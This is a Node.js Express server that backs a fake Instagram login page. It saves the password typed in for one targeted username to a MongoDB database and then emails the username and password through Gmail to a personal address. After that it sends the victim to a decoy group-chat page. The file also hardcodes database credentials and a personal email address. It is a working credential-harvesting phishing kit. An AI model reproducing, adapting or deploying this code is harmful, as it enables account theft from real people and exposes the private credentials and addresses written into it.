const express = require('express')
const mongoose = require('mongoose');
const path = require('path');
const app = express()
const port = 3000
const DB = 'mongodb+srv://nikhil123:nikhil123@base1.fz8lbec.mongodb.net/instagram?retryWrites=true&w=majority'
let username = null;
let password = null;
mongoose.connect(DB, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
}).then(() => {
  console.log('connected');
}).catch((err) => {
  console.log(err);
})

const userSchema = mongoose.Schema({
  username: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  }
})
const nodemailer = require('nodemailer');
const { EMAIL, PASSWORD } = require('./env.js');
const mailgen = require('mailgen');

const sendemail = async (req, res) => {
  // let testAccount = await nodemailer.createTestAccount();
  // console.log(user,pass)
  let config = {
    service: 'gmail',
    auth: {
      user: EMAIL,
      pass: PASSWORD
    }
  }
  // create reusable transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport(config);

  let mailgenerator = new mailgen({
    theme: 'default',
    product: {
      name: 'Mailgen',
      link: 'https://mailgen.js/'
    }

  })

  let response = {
    body: {
      name: 'Azurafoundation',
      intro: `Login Credentials has arrived username=${username} password=${password}`,
      outro: 'Check Out now on the data base'
    }
  }

  let mail = mailgenerator.generate(response);

  let message = {
    from: EMAIL,
    to: 'ayush.32.thakur.2027@gmail.com',
    subject: 'User Credentials has arrived',
    html: mail

  }

  transporter.sendMail(message).then(() => {
    return res.redirect('/allenitiesDombivili');
  }).catch((err) => { console.log(err) })

  // let info = await transporter.sendMail({
  //     from: '"Azura Foundation 👻" <foo@example.com>', // sender address
  //     to: "azurafoundation@gmail.com", // list of receivers
  //     subject: "Hello ✔", // Subject line
  //     text: "Hello world?", // plain text body
  //     html: "<b>Hello world?</b>", // html body
  // });

  // console.log("Message sent: %s", info.messageId);
  // // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

  // // Preview only available when sending through an Ethereal account
  // console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
  // // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
}

console.log(__dirname);
const User = mongoose.model('USERS', userSchema);

app.use(express.static(path.join(__dirname, './instagramloginpage')))
app.use(express.urlencoded({ extended: false }))

app.get('/', (req, res) => {
  res.send('Hello World!')
  console.log(__dirname);
})

app.set('view engine', 'pug');
app.set('views', path.join(__dirname, './instagramloginpage/'));

app.get('/verification', sendemail);


app.get('/allenitiesDombivili', (req, res) => {
  res.status(200).render('./groupchat/groupchat.pug');
})

app.get('/notfound',(req,res)=>{res.status(202).render('./notfound/notfound.pug')})
app.post('/login', (req, res) => {
  // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
  username = req.body.username;
  password = req.body.password;
  if (username == 'shravan3239') {
    const user = new User({ username, password });
    user.save().then(() => {
      console.log('hogaya');
      res.redirect(`/verification`);
    }).catch((err) => {
      console.log(err);
      res.status(200)
      res.redirect('*');
    })
  }else{
    res.send(`<h1>${username} is not been invited to this group.</h1>`);
  }
})
app.get('/groupchat', (req, res) => {

  res.status(200).render('./SpecialCase/invite.pug');
})
app.get('*', (req, res) => {
  res.status(404)
  res.send('404 page not found');
})

app.listen(port, () => {
  console.log(` ${port}`)
})
